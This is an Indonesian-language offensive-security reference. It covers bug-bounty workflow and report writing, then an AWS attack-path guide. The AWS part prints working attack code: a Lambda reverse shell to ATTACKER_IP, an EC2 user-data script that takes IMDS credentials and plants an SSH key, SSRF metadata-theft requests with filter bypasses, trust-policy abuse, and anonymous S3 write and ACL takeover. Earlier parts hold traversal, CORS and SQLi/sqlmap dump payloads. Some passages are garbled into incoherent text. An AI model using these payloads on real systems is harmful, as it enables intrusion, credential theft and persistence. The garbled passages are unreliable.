Semua aktivitas dibatasi timer. Tanpa time-box, waktu habis di recon tanpa temuan.

### Tabel alokasi per sprint 5 hari

| Fase | Box | Output wajib |
|---|---|---|
| Recon permukaan | 2 jam | Kumpulan aset unik (`httpx -sc -t` hasil) |
| Mapping + pilih target (max 5) | 1 jam | Shortlist di ledger |
| Hunting per target | 2×90 menit/hari × 3 target | Notes + PoC |
| Penulisan report | 45 menit per temuan | Draft report |
| Triage harian duplikat check | 15 menit | Status di ledger |

### Perintah pewaktu (Linux)

```bash
# Boxing 90 menit hunting per target
at now + 90 minutes <<< "notify-send 'TIMEBOX HABIS: rotate target'"
# atau
sleep 5400 && notify-send "ROTATE"

# Pomodoro kecil untuk recon shock
time (@ bash -c 'subfinder -d target.com -silent | httpx -silent -title')
```

| Aturan pelanggaran | Konsekuensi |
|---|---|
| Hunting melebihi box 2× | Dropout target hari itu, catat di ledger sebagai "sunk cost" |
| Target 0 insight setelah 2 sprint (10 jam) | Target dibuang permanen, tulis post-mortem 3 baris |

---

## 4.3 Triage Cepat

Pipeline memfilter ratusan aset ke ≤ 5 target per sprint. Semua otomatis, keputusan manual hanya di tahap akhir.

### Pipeline

```bash
# Stage 1: enumerasi + alive check
subfinder -d target.com -all -silent \
  | httpx -silent -status-code -title -tech-detect -follow-redirects \
  | anew live.txt

# Stage 2: filter sinyal menarik
cat live.txt | grep -Ei \
  '(admin|stag|dev|test|qa|internal|vpn|jenkins|grafana|kibana|s3|backup|old|demo)' \
  > priority.txt

# Stage 3: fingerprint cepat
nuclei -l priority.txt -t nuclei-templates/technologies/ -severity info -silent

# Stage 4: parameter + entry point
cat priority.txt | katana -d 3 -silent | urf -uway | sort -u > params.txt
```

### Tabel sinyal → tindakan

| Sinyal dari triage | Tindakan hunting |
|---|---|
| nginx 1.25 + header `X-Powered-By` hilang tapi behavbor proxy | Tes cache deception (`/#/../../etc/passwd`), alias traversal |
| `.git/` 200 via `httpx -td` | Dump + segera democ pull |
| Halaman login versi lama (mis. old-JS bundle React 16) | JS analysis → endpoint tersembunyi |
| `staging.` di robots.txt | Full hunt staging — config drift |
| CORS `Access-Control-Allow-Origin` reflektif | Uji `Origin: evil.com`, credential |

Triage 15 menit harian: cek `grep -c "Duplicate" ledger.md`. Kalau duplicate rate sprint > 40% → scope terlalu jenuh, ganti target.

---

## 4.4 Kolaborasi 4 Otak (Pair Hunting)

Format tetap: 2 hunter, 1 target, 1 sesi.

| Peran | Isi kerja | Durasi rotasi |
|---|---|---|
| Driver | Tangan di keyboard, eksekusi payload | 45 menit |
| Navigator | Baca response, cari variasi, catat di ledger real-time | 45 menit |

Rotasi tiap 45 menit. Sesi = 2 jam 15 menit (3 rotasi + 15 menit debrief).

### Setup sinkron

```bash
# Share terminal gunung (tmate)
tmate -F   # bagikan ssh/session ke navigator
# Ledger kolaboratif: Obsidian Sync / git shared
git clone git@internal:redteam/findings.git   # commit tiap sinyal — branch per-target
```

Aturan dasar:
1. Navigator **tidak menyentuh keyboard** (cukup 1 sinyal "coba X" per menit).
2. Semua sinyal — joke pasti disimpan: `echo "- [ ] signal" >> ledger.md && git commit -am "signal"`
3. Debrief wajib menghasilkan: prioritas besok, atau keputusan drop target.
4. Payout split 50/50 harus dibicarakan **sebelum** temuan — tidak ada negosiasi pasca-report.

Mengapa berhasil: navigator tidak dominated oleh tool/fokus; driver tidak mental overhead. Temuan di pair session menurut pengalaman tim adalah duplikasi insight dari dua sudut pandang jika target tersebut dijadikan/tidak.

---

## 4.5 Ledger Temuan

Format file tunggal `ledger.md` per kuartal, backup git.

### Template

```markdown
## [2025-06-12] target.com — staging.s3-bucket
- **Bug**: Unauthenticated S3 bucket expose (aws s3 ls s3://target-backup → 200)
- **Kategori**: IDOR/Data expose | **Severity est**: High
- **PoC**: `aws s3 ls s3://target-backup --no-sign-request`
- **Impact**: 4.2GB dump SQL termasuk tabel users (hash bcrypt)
- **Status**: submitted #RPT-0000
- **Catatan**: 3 hari jadi triaged — duplikat? jika duplicate oleh hunter lain 2 hari sebelumnya → cek timestamp
- **Waktu investasi**: 2.7 jam
```

### Statistik wajib per sprint (shot)

```bash
#!/bin/bash
# sprint_stats.sh — jalan tiap Jumat
total=$(grep -c "^## " ledger.md)
dup=$(grep -ci "status: duplicate" ledger.md)
accepted=$(grep -ci "status: accepted" ledger.md)
hours=$(grep -oP "investasi\*\*: \K[0-9.]+" ledger.md | awk '{s+=$1} END {print s}')
echo "temuan=$total dup=$dup accepted=$accepted hours=$hours"
echo "ROI kumulatif: $(grep -oP 'payout\*\*: \$\K[0-9]+' ../../payouts.csv | awk '{s+=$1} END {print s}')"
```

---

## 4.6 Checklist Harian (print)

```
KOSONG (kosongkan setiap pagi, isi real-time):

□  5m   Cek 3 sumber program baru (H1 dir / BC / Inti)
□ 10m   Recon increment: subfinder + httpx → diff vs kemarin (anew)
□ 15m   Triage live.txt → bagi target 3 level (prioritas/hold/drop)
□ 15m   Cek semua report aktif: respon triager? triage ulang saat ada balasan
□ 2×90m HUNTING (timebox! timer jalan) — sesuai target prioritas
□  5m   Update ledger: setiap sinyal, jejak vendor/buruan, signifikansi
□  5m   Commit & push ledger → findings.git
□  5m   Review ledger duplicate rate — kalau >40% → planning rotasi besok
```

### Metrik mingguan dipantau

| Metrik | Target sehat | Threshold alarm |
|---|---|---|
| Temuan submitted / sprint | ≥ 3 | 0 = scope / metodologi opname |
| Duplicate rate | < 30% | > 50% selama 2 sprint → program diganti |
| Jam per temuan | < 4 jam | > 8 jam → perbaiki triage, bukan hunter |
| Resolusi program | < 10 hari | > 30 hari → kurangi konten di program itu |
| USD / jam (trailing 90 hari) | ≥ median freelance rate team | Drop program bila beruntun turun 2 kuartal |

---

## 4.7 Jebakan Operasional

1. **Recon loop tanpa ujung.** Subfinder + alterx + perm utas menggandakan aset 10× tiap dengan probe baru tanpa men-hunt apa pun. Recon bukan hunting. Jika aset tetap 600+ tanpa di-probe semuanya — stop, ambil top 50 dan mulai hunting.

2. **Time-box diterapkan ke report, bukan hanya hunting.** Temuan di ledger dilebihi temuan tanpa report 3 hari → triager kalah cepat, jadi duplikat. Tulis draft report dalam 15 menit sambil konteks masih fresh.

3. **"Periksa buku program" yang tidak dipelajari.** Banyak program: aplikasi otomatis scanning variabel — otomatis out-of-scope. Temuan IDOR di WordPress plugin → N/A. Baca policy method by method, sebelum fingerprint target.

4. **Pair session tanpa ledger real-time.** Sesi kolaborasi tanpa commit kembali ke shared ledger → 2 dan 60 menit terbuang karena recall selepas sesi.

5. **Program baru = bukan program siap kirim.** Lain program, 1 minggu post-launch sering tanpa triager aktif. Report duduk 3–4 minggu tidak dinilai. Jangan men-invest lebih dari 10 jam sebelum ada first resolved signal.

6. **Bug moderated di staging ≠ target produksi.** Temuan di staging tanpa mengkonfirmasi impact di produksi → 60%+ report akhirnya downgraded/di-ignore. Selalu verifikasi jembatan via staging→prod (shared origin, S3 shared, sekian subdomain identical).

7. **Match metric di atas yang diakumulasi sesi alat` automated`**. Akumulus konfirmasi untuk stage 2 bisa lebih panjang dari hunting itu sendiri. Kuncinya prompt pipeline yang scalable.

8. **Ghost tooling dagangan memes di report `trailing slider`.** `Kamera dass is seFul untuk kontes` — jika Anda perlu: `Webhook,Timebox` tidak berhenti di pos 90 menit kalau report sudah di tangan tetapi Anda belum push "Submit". Submit adalah bagian dari box.


## reporting

# reporting — bb

# Referensi: Report Writing Berbayar (VDP/Bug Bounty)

## 1. Formula Judul

Format: `[Komponen/Versi] — [Tipe Kerentanan] via [Vektor] → [Dampak Terkonkret]`

| Elemen | Buruk | Baik |
|---|---|---|
| Komponen | `Website lu` | `api.target.co.id v2.3 (Nginx 1.25.3)` |
| Tipe | `Bug di login` | `IDOR BAC/INJ-01` |
| Vektor | `ada bug` | `via ganti parameter ?order_id=` |
| Dampak | `bahaya` | `akses data PO pelacen 340k record` |

Contoh final:
```
api.target.co.id v2.3 (Nginx 1.25.3) — IDOR pada /orders/{id}
via walk-down numeric → eksposur PII 340k order
```

Template cepat:
```
[HOST+ENDPOINT] [VERSI] — [CWE-XX Nama] via [prekondisi/vektor] → [dampak bisnis + angka]
```

Jangan pernah pakai kata "mungkin", "kemungkinan" di judul. Kalau spekulatif, itu bukan laporan berbayar, itu draft.

## 2. CVSS 4.0 Vector + Justifikasi

Format vektor: `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N`

Metrik wajib + supplemental (CVSS 4.0 punya tambahan `S:` untuk sistem dan `SIU/CR` dsb tergantikan `E:/CR/AR` di environmental).

Contoh hasil disusun via calculator FIRST (firstscore.oss-fuzz... gunakan https://www.first.org/cvss/calculator/4.0):

```
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:L/VA:N/SC:L/SI:L/SA:N
Base Score: 8.5 (High)
```

Tabel justifikasi per metrik (WAJIB di laporan yang dibayar):

| Metrik | Nilai | Justifikasi |
|---|---|---|
| AV | N | Eksploit via HTTPS publik, tanpa akses jaringan internal |
| AC | L | Tidak perlu race/kondisi khusus; sekali request |
| AT | N | Tidak ada mitigasi aktif (WAF Cloudflare 2024-11 tidak blok payload) |
| PR | L | Butuh akun gratis ter-registrasi (registrasi self-service) |
| UI | N | Tidak butuh interaksi korban |
| VC | H | Akses penuh data order milik user lain termasuk PII (nama, alamat, no HP) |
| VI | L | Bisa ubah status pengiriman if/else tapi tidak delete |
| SC | H | Endpoint share DB MariaDB 10.11 dengan payment-svc → data kartu token ikut terekspos |
| SI | L | Tidak ada crash service, tapi bisa spam order status |

**Anti-pattern penilaian di atas maksimal**: score CVSS tidak otomatis = severity bounty. Banyak program punya matrix sendiri (Critical = RCE/SQLi full dump, High = SSRF internal, dst). Lampirkan CVSS sebagai bahan, bukan vonis. Kalau kamu nulis "Critical 9.8" untuk XSS reflected di halaman marketing, triager akan reject rating, bukan bug-nya.

## 3. Impact → Risiko Bisnis

Formula translasi:
```
[Aksi teknis] → [Aset kena] → [Konsekuensi regulasi/uang/reputasi] → [Angka]
```

Contoh:

| Teknis | Aset | Risiko | Angka |
|---|---|---|---|
| SQLi UNION dump `users` | Tabel 1.2jt baris (kolom `ktp_no`, `email`) | UU PDP No. 27/2022 pasal 46 sanksi 2% revenue; notification cost | Rp X per record × 1.2jt |
| Stored XSS di admin panel | Session admin | CSRF token theft → takeover admin → approve refund | Fraud refund rata-rata program Rp 50jt/kasus (hist. internal) |
| SSRF → metadata AWS EC2 IMDSv1 | Credentials role `ecs-task-readonly` | Lateral ke S3 bucket `prod-invoices` | 4.3GB PDF invoice |

Kalau kamu tidak bisa isi kolom "Angka" dengan data nyata (logs, jumlah baris hasil query `SELECT COUNT(*)`, output `aws s3 ls --recursive | wc -l`), peringkat kejatuhan. Yang dibayar adalah bukti dampak, bukan potensi dampak.

## 4. Langkah Reproduksi untuk Triager

Struktur: **Prasyarat → Burp/curl minimal → Expected vs Actual → Evidence**.

Prasyarat harus self-contained:

```markdown
**Prasyarat:**
- 2 akun terpisah: attacker@example.com (ID 8812), victim@example.com (ID 9417)
- Chrome 131.0.6778.x, proxy Burp Suite 2024.11
- Pada browser/polisi pertama, login victim → buat 1 order via POST /api/orders → catat order_id: 55102
- Buka tab baru (incognito), jangan logout victim
```

Langkah minimal dengan artefak copy-paste:

```bash
# STEP 1 — login attacker dan simpan token
TOKEN=$(curl -sk -X POST https://api.target.co.id/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@example.com","pass":"P4ssw0rd!"}' \
  -w '%raw_n' -o /dev/null --data-binary ...
echo "$TOKEN"

# STEP 2 — akses order milik victim
curl -sk https://api.target.co.id/orders/55102 \
  -H "Authorization: Bearer $TOKEN"

# EXPECTED: HTTP 403 {"error":"FORBIDDEN_RESOURCE"}
# ACTUAL:   HTTP 200, body mengandung "email":"victim@example.com","addr":"Jl. ...","total":1850000
```

Evidence minimal:
1. HTTP request/response full (raw Burp, jangan screenshot yang terpotong header)
2. Video 30–60 detik kalau butuh UI (burp pada mobile Android 15)
3. Timestamp + versi build target (`X-Build-Hash: a3f`);

**Uji paling penting sebelum submit: repro from clean machine.** VPN baru, browser fresh profile, tanpa cookie manual. Kalau gagal di clean environment, triager juga akan gagal.

## 5. Eskalasi Severity Berantai yang Sah

Chain sah = setiap link punya bukti, bukan spekulasi. Pola:

```
Link 1 (terbukti)   → Link 2 (dibuktikan dengan modifikasi 1 varian) → Impact final
```

Contoh chain IDOR → account takeover:

| Langkah | Bukti | Status |
|---|---|---|
| L1: IDOR ganti `phone` via PUT /users/{id} | HTTP 200, DB reflect | Terbukti |
| L2: Login alur "reset password via OTP SMS ke nomor terdaftar" | Dok publik + uji di akun sendiri (kirim OTP sendiri) | Terbukti |
| L3: OTP bisa di-replay ke akun victim → takeover | TIDAK DIBUKTIKAN — hanya impilikasi | Spekulatif |

Aturan: chain dilaporkan sebagai **satu report dengan severity link terkuat yang bukti penuh**, chain selanjutnya sebagai "attack narrative" di bagian impact. Jangan klaim severity L3 tanpa demo L3. Banyak triager bonus untuk chain yang benar, reject untuk chain inflasi.

Contoh chain lengkap yang dibuat full (file kunci: jalankan di akun dummy sendiri sebagai victim):

```bash
# L2: kirim OTP ke akun dummy
curl -sk -X POST https://api.target.co.id/auth/otp/request \
  -H 'Content-Type: application/json' \
  -d '{"email":"my-dummy@example.com"}'
# L3:OTP intercept di Burp → login substitusi id target → ambil session

curl -sk -X POST https://api.target.co.id/auth/otp/verify \
  -d '{"email":"my-dummy@example.com","otp":"CENSORED-ACTUAL-CODE"}'
# HTTP 200 "token":"..." → akses GET /users/9417 OK
```

Gunakan akun dummy sebagai korban tiap kali bisa, ini menjadikan chain full-proof AND legal.

## 6. Alasan Reject Umum dan Pencegahan

| Reject Code | Arti | Pencegahan |
|---|---|---|
| **Duplicate** | Sudah dilaporkan orang lain | Sebelum submit, skip dan scan daftar resolves publik (disclosure/HackerOne activity). Cek umur bug: duplikat accrue kemarin bisa rusak internal fix-part commit oleh repo public GitHub target — cek apakah laporan sebelumnya masih Anda untuk patch di changelog |
| **Out of Scope (OOS)** | Asset/bug type tidak masuk policy | Baca policy value sebelum reconnaissance selesai: wildcard domain cek `*.target.co.id` vs `target.co.id` beda; banyak program exclude `nginx version disclosure`, Open Redirect, clickjacking, self-XSS, kelemahan rate-limit low-impact |
| **Not Reproducible** | Triager tidak bisa repro | Follow section 4 ketat; tambahkan video; test di env berbeda (Chrome 131 AND Firefox 133); jangan pakai data entitas unik yang mungkin Anda reset |
| **Theoretical / Insufficient Impact** | Tanpa bukti dampak konkret | Wajib PoC up-to-impact: untuk SSRF jangan hanya 200 status metadata API, tapi EXFILTRATED credentials; untuk XSS jangan hanya alert placeholder, tapi ambil `document.cookie` di dummy login |
| **Known / Accepted Risk** | Sudah diterima/di-tolerir | Cek did disclosure list target; kalau Anda temukan BYPASS pada patch existing → itu laporan BARU dengan referensi commit/patch ID |

Format singkat menghindari semua reject di deskripsi pembuka laporan:

```
Scope reference: api.target.co.id (dalam IP allowlist pg. 2 policy v2024-11-01)
Not in public disclosure/resolved list as of 2024-11-28 (checked 08:00 UTC)
Reproduced clean: Windows 11 24H2 + Chrome 131 + Firefox 133
Impact proven: full exfil 3 record PII (dummy akown)
```

## 7. Before/After Laporan Nyata

### Before (komentar triager: reject-candidate)

> **Judul:** SQL Injection di situs Anda
>
> **Deskripsi:**
> Saya menemukan SQL injection di website Anda. Ini sangat berbahaya karena attacker bisa mengambil seluruh database. Tolong segera perbaiki dan saya harap mendapat bounty yang sesuai karena ini critical severity 9.8.
>
> **PoC:**
> Saya masukkan `' OR 1=1--` di parameter dan muncul error.
>
> **Impact:** Full database compromise.

Kenapa gagal:
- Tidak ada endpoint/parameter spesifik
- "Error" = mungkin error handling biasa, bukan confirmasi injection
- Score 9.8 tanpa vektor + tanpa data exfiltrated
- Tidak ada langkah repro deterministik

### After (accepted, paid)

```markdown
**Judul:** staging-search.target.co.id (Elastic 7.17.9) — SQL Injection
via parameter `q` di /search.php → dump tabel `users` (1.2jt baris)

**Ringkasan:** Parameter `q` di endpoint search dimasukkan langsung ke
prepared string PDO yang dijalankan via `LIKE` tanpa binding (PHP 8.2,
prestashop fork custom). Time-based UNION injection memastikan
eksfiltrasi data PII user.

**CVSS 4.0:** CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N  →  9.3 Critical
- AV:N — staging-search.target.co.id ter-expose publik via DNS splitter (bukan_internal staging)
- PR:N — tidak perlu login
- VC:H — kolom yang ter-dump: name, email, phone, ktp_no (lihat evidence #3)
- SC:H — berbagi koneksi PDO dengan tabel reports transaksi

**Langkah Reproduksi:**

Prasyarat:
- sqlmap 1.9 atau Burp Suite 2024.11
- Windows 11 24H2 / Ubuntu 24.04, tanpa header khusus

STEP 1 — Confirm injection (boolean-based):
curl -s "https://staging-search.target.co.id/search.php?q=gadget' AND 1=1-- -" \
  | grep -c "RD-100"
# Output: 3  (produk RD-100 muncul — query valid)

curl -s "https://staging-search.target.co.id/search.php?q=gadget' AND 1=2-- -" \
  | grep -c "RD-100"
# Output: 0  (query di-alter → injeksi terkonfirmasi)

STEP 2 — Exfilskal proof (dengan sqlmap, batasi ke 3 baris per program ceiling):
sqlmap -u "https://staging-search.target.co.id/search.php?q=gadget" \
  -p q --technique=BT --threads=1 --dump -T users --where "id IN (1,2,3)"

STEP 3 — Cleanup: tidak ada write, tidak ada data di-download di luar 3 baris ini (log attachment)

**Evidence:**
1. Request/response Burp raw (attachment 1)
2. Session recording 45 detik (attachment 2)
3. sqlmap output 3 baris dengan `ktp_no`, `email` (attachment 3, PII di-mask 80%)

**Impact ke bisnis:**
- UU PDP 27/2022 → notification breach wajib 3×24 jam; denda administratif
  hingga 2% revenue tahunan
- Estimasi notification cost: 1.2jt × industry standard
- Tabel `reports` berisi data backoffice — potensi insider fraud targeting

**Scope check:**
- staging-search.target.co.id = subdomain dari target.co.id, masuk scope OOS
  exception #4 policy v2024-11-01 bag 2.1 tercantum "semua subdomain aktif DNS"
- Tidak ada disclosure sebelumnya untuk endpoint ini (checked 2024-11-28)
- Data yang di-screenshot: 3 baris dari akun dummy yg kami buat via halaman
  register publik, bukan user nyata
```

Kenapa diterima: judul ber-searchable, vektor CVSS + justifikasi per-metric, 3 langkah repro deterministik curl/sqlmap, bukti exfil dibatasi dan dummy-only, scope check di awal — triager tidak perlu bertanya satu pertanyaan pun.

## 8. Jebakan Operasional di Lapangan

1. **Staging environment berubah diam-diam.** Bug yang di-PoC hari Senin bisa gagal di repro hari Kamis karena deploy CI/CD otomatis. Solusi: pasang cron `curl` sanity-check tiap 6 jam setelah submit, submit laporan di hari yang sama dengan temuan, gunakan timestamp + `X-Build-Hash` di evidence.

2. **Akun dummy diblokir sebelum triager repro.** Banyak program idle-timeout akun baru atau butuh verifikasi email. Test apakah akun bisa login ulang besoknya sebelum bergantung padanya. Kalau email OTP-based, gunakan domain email yang kamu kontrol (bukan Gmail temp yang expire 10 menit).

3. **WAF menutup lubang setelahmu submit.** Kalau payload kamu simpen di issue tracker triager tersimpan as-is tapi pada hari repro, Cloudflare ruleset sudah update. Gunakan 2–3 varian payload di laporan, dan cantumkan kapan terakhir di-test.

4. **Chain dianggap dua laporan terpisah.** Kalau IDOR dan OTP-BUG dilaporkan terpisah, masing-masing dipayment low; dilaporkan bersama sebagai chain → high. Tapi kalau dianggap terlalu luas karena bug kedua terjadi di endpoint berbeda — triager bisa minta split dan kamu kehilangan momentum. Solusi: sebut kedua endpoint di judul sejak awal.

5. **ID yang disebut bukan ID di sistem mereka.** Anda panggil "order 55102" tapi terinterface via UUID. Sertakan kedua (id internal dari response + UUID) agar tidak terbalik saat triager repro.

6. **X-Forwarded-For bypass worked di test env, failed di prod.** Banyak staging tidak behind cluster dengan IP permission config yang sama. Sebelum mensubmit IDOR/SSRF/authorization bug, selalu verifikasi di prod endpoint kalau scope mengizinkan; staging-only bug sering di-OOS di program serius.

7. **Kamu nulis `[CENSORED]` di payload.** Ganti: `(ganti literal string ini, tanpa kutip eksak)` menghapus standar angka yang disuak akses — reproduksikan via seed pasti. Aleatoric cukup att doc: `payload di attachment .txt saja` — jangan inline enc dalam code block.

8. **Submission sebelum jam kerja internal.** Penalty lower triage queue bypass. Submitlah Senin–Kamis 09:00–14:00 zona triager (bukan zona Anda). Laporan yang munculkan clear-page saat reviewer baru masuk biasa dapat respon cepat + duplikat sulit muncul.


# ===== DOMAIN: cloud =====


## aws

# aws — cloud

# Referensi AWS Attack Path — Enum, Privesc, Lateral, Persistence

## 1. IAM Enumeration & Credential Recon

### 1.1 Passive: identityennis/enumerate-iam

Tool: `enumerate-iam` (v0.6.x, Python 3.10+)

```bash
pip install enumerate-iam
enumerate-iam --access-key AKIA... --secret-key ... [--session-token ...]
```

**Apa yang dikirim:** Panggilan `GenerateServiceLastAccessedDetails`, `Get*`, `List*`, `SimulatePrincipalPolicy` ke ratusan endpoint AWS API dengan credential low-priv.
**Output:** Daftar service + action yang **tidak** return `AccessDenied`/`AuthFailure` — contoh:

```
- service: sts
  actions: GetCallerIdentity, AssumeRole
- service: s3
  actions: ListAllMyBuckets (GetBucketLocation works)
```

**Kenapa berhasil:** IAM API tidak punya rate limit agresif untuk `Get*`/`List*` dan error message membedakan `AccessDenied` (policy deny) vs `InvalidClientTokenId` (credential mati) vs `UnauthorizedOperation` (explicit deny) — leak informasi.

Perbedaan error yang dipakai untuk fingerprint:

| Error | Arti |
|---|---|
| `AccessDenied` | Key valid, action tidak diizinkan |
| `UnauthorizedOperation` | Explicit deny di policy |
| `InvalidClientTokenId` | Key tidak valid/dihapus |
| `ExpiredToken` / `SessionToken` | STS token lewat (15min–12h) |

### 1.2 Pacu

```bash
pacu
> import_keys --all
> run iam__enum_permissions
> run iam__enum_users_roles_policies_groups
> run sts__enum_role --role-names dev-admin,prod-deploy
> run s3__enum
> whoami
```

Module penting:

| Pacu module | Sumber data | Catatan |
|---|---|---|
| `iam__enum_permissions` | `GetPolicy`/`Simulate*`, `list_attached_*` | Dump semua policy attach ke principal |
| `iam__enum_users_roles_policies_groups` | `ListUsers/ListRoles/ListPolicies` | Butuh `iam:List*` minimal |
| `sts__enum_role` | brute role name → `AssumeRole` | Trust policy lemah = jackpot |
| `iam__enum_roles` | enumerasi role via `ListRoles`, cek trust | bedakan dengan sts__enum_role (brute) |
| `s3__enum` | `ListBuckets`, head object acl | — |
| `iam__privesc_scan` *(pakai `privesc_scan` workflow)* | validasi otomatis privesc vector | lensa:bishopfox iamacting”

Cek manual identify:

```bash
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name <u>
aws iam get-policy-version --policy-arn <arn> --version-id v1
```

**Kenapa gagal:** `iam:List*` saja tanpa `Get*` → Pacu hanya dapat nama, bukan isi policy. `SimulatePrincipalPolicy` butuh `iam:SimulatePrincipalPolicy` jarang diberikan ke non-admin.

## 2. Privesc: `iam:PassRole` + Lambda / EC2

Prasyarat kombinasi minimal:

| Vector | Permission minimal | Syarat tambahan |
|---|---|---|
| Lambda create+invoke | `iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction` | Role harus punya trust `lambda.amazonaws.com` |
| EC2 runInstances | `iam:PassRole`, `ec2:RunInstances` | Role trust `ec2.amazonaws.com` |

### 2.1 Path Lambda

**Langkah 1 — cari role yang bisa di-pass:**

```bash
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.contains('lambda.amazonaws.com')].RoleName"
```

**Langkah 2 — zip payload reverse shell (Python 3.12 runtime di Lambda):**

```python
# lambda_function.py
import socket, subprocess, os
def handler(event, context):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("ATTACKER_IP", 443))
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
    return {"ok": True}
```

```bash
zip lamb.zip lambda_function.py
aws lambda create-function \
  --function-name backup-sync \
  --runtime python3.12 \
  --role arn:aws:iam::123456789012:role/EC2AdminRole \
  --handler lambda_function.handler \
  --zip-file fileb://lamb.zip
aws lambda invoke --function-name backup-sync /dev/null
```

**Apa yang muncul:** handler jalan dengan permission role target. Kalau role itu `PowerUserAccess`/managed EC2 admin → bisa `CreateAccessKey` user lain, dsb.

**Kenapa berhasil:** `PassRole` mencantumkan `Resource: *` (sangat umum), trust role `lambda.amazonaws.com` sudah pernah dipakai fungsi legit, dan CloudTrail hanya mencatat `CreateFunction` — **tidak** mencatat permission yang diwarisi saat runtime.

**Kenapa gagal:**
- `iam:PassRole` dengan `Resource: arn:aws:iam::*:role/service-role/*` → hanya bisa pass role service-specific.
- Permission boundary di user → pass berhasil tapi role di-boundary.
- `lambda:CreateFunction` ada tapi **tidak ada `lambda:InvokeFunction`** → dead end (cari trigger S3/config alternative).
- Region blocker via SCP.

### 2.2 Path EC2

```bash
aws ec2 run-instances \
  --image-id ami-0c55b159cbfafe1f0 \
  --instance-type t3.micro \
  --iam-instance-profile Name=AdminProfile \
  --user-data file://shim.sh \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=jenkins-temp}]'
```

`shim.sh` — user-data fetch credential IMDS dan export:

```bash
#!/bin/bash
TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ -H "X-aws-ec2-metadata-token: $TOKEN" > /tmp/role.txt
# dan/atau drop SSH key authorized_keys
echo "ssh-ed25519 AAAA... key" >> /home/ec2-user/.ssh/authorized_keys
```

**Kenapa berhasil:** metadata role EC2 adalah native session, tidak perlu create access key (tidak muncul di `iam:CreateAccessKey` event trail).

## 3. STS AssumedRole Chain

### 3.1 Eksploit persetujuan TrustPolicy (trust policy lemah)

Enumerasi chain — dari role internal, `AssumeRole` ke role di akun lain yang salah percaya (misal `Principal: {"AWS": "*"}` di trust):

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::987654321098:role/CrossAccountAudit \
  --role-session-name temp-audit \
  --duration-seconds 900
```

Output: `AccessKeyId`/`SecretAccessKey`/`SessionToken` untuk akun 987654321098. Export:

```bash
cat > creds.sh <<<'EOF'
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
EOF
source creds.sh && aws sts get-caller-identity
```

**Kenapa berhasil:** kecuali ditambah `aws:PrincipalOrgID`, `aws:PrincipalArn`, atau `sts:ExternalId` di condition, role itu bisa di-asumsi siapa pun. Trust `Principal: "*"` + tanpa condition = anybody.

### 3.2 Chain hopping (jaga SSO asal)

```bash
# session dalam session, duration menurun max 1h tidak default
aws sts get-session-token --duration-seconds 900   # kalau perlu furigone-credential
```

Catatan chain — `AssumeRole` dari role → role → role di trail muncul chain `AssumedRoleId` dengan suffix `:session-name` nested. Session token adalah path landscape lateral via `sts:AssumeRole` **dari akses identity yang dioper** dan itu turun 1 hop maks (kecuali `AssumeRole` antar-role).

**Kenapa gagal:** `sts:ExternalId` mismatch → `AccessDenied`. MFA condition → butuh `--serial-number` + `--token-code`. Max session duration role 3600s default → session meninggalkan trace pendek (bagus untuk kita, buruk untuk kerja).

Pacu:

```
> run sts__enum_role --word-list roles-wordlist.txt
> run sts__get_federation_token
```

---

## 4. SSRF → IMDSv2 Grab

Target: instance EC2 di belakang aplikasi vulnerable SSRF, mis. nginx 1.25 reverse proxy Docker/ECS, aplikasi Node/Java yang fetch URL.

### 4.1 IMDSv2 (token diperlukan)

```bash
# Dua tahap — SSRF primitive harus support header injection
curl http://target:80/fetch?url=http://169.254.169.254/latest/api/token
# kalau API backend Node: semple with header via URL param
curl "http://target:80/proxy" -H "X: $(curl -sXM PUT \
  'http://169.254.169.254/latest/api/token' ...)"
```

Contoh pragmatic — SSRF di app Node.js (request parsing header ikut):

```
PUT http://169.254.169.254/latest/api/token
Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
→ token: AQAAA...(284-char base64)

GET http://169.254.169.254/latest/meta-data/iam/security-credentials/RoleName
Header: X-aws-ec2-metadata-token: <token>
→ AccessKeyId, SecretAccessKey, Token, Expiration
```

### 4.2 IMDSv1 (kalau instance belum `HttpTokens: required`)

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Langsung JSON, tanpa token.

Bypass habitual:
- **70-hop redirect**: beberapa app (mis. SSRF filter) cek `localhost`/`169.254` di path, redirect dari IP publik sendiri yang `Location: http://169.254...`
- Parse trick: `http://[::ffff:169.254.169.254]`
- `http://metadata.google.internal` (GCP ganda-cloud)
- ECS task metadata: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`

Fix IMDSv2: `aws ec2 modify-instance-metadata-options --http-tokens required --instance-id i-...` — menjadi contoh pengukuran blue team untuk audit.

**Kenapa berhasil:** credential role di IMDS diterbitkan tanpa login audit IAM, dan banyak pipeline/cloudcustomer belum enforce `HttpTokens required`.
**Kenapa gagal:** hop limit 1 di IMDSv2 (`--http-put-response-hop-limit 1`) → reverse proxy / target hop >1 gagal; WAF blok IP 169.254; SRVF hanya GET tanpa header injection.

## 5. S3 Misconfig

### 5.1 List / Write / ACL Theft

```bash
# anonymous list bucket
aws s3 ls s3://company-backups --no-sign-request
aws s3 ls s3://company-backups --no-sign-request --recursive

# blind write (public put)
aws s3 cp shell.sh s3://deploy-bucket/scripts/ --no-sign-request

# ACL takeover — write ACP
aws s3api put-object-acl --bucket cfg-bucket --key app.env \
  --grant-full-control id=<attacker-canonical-id> --no-sign-request
```

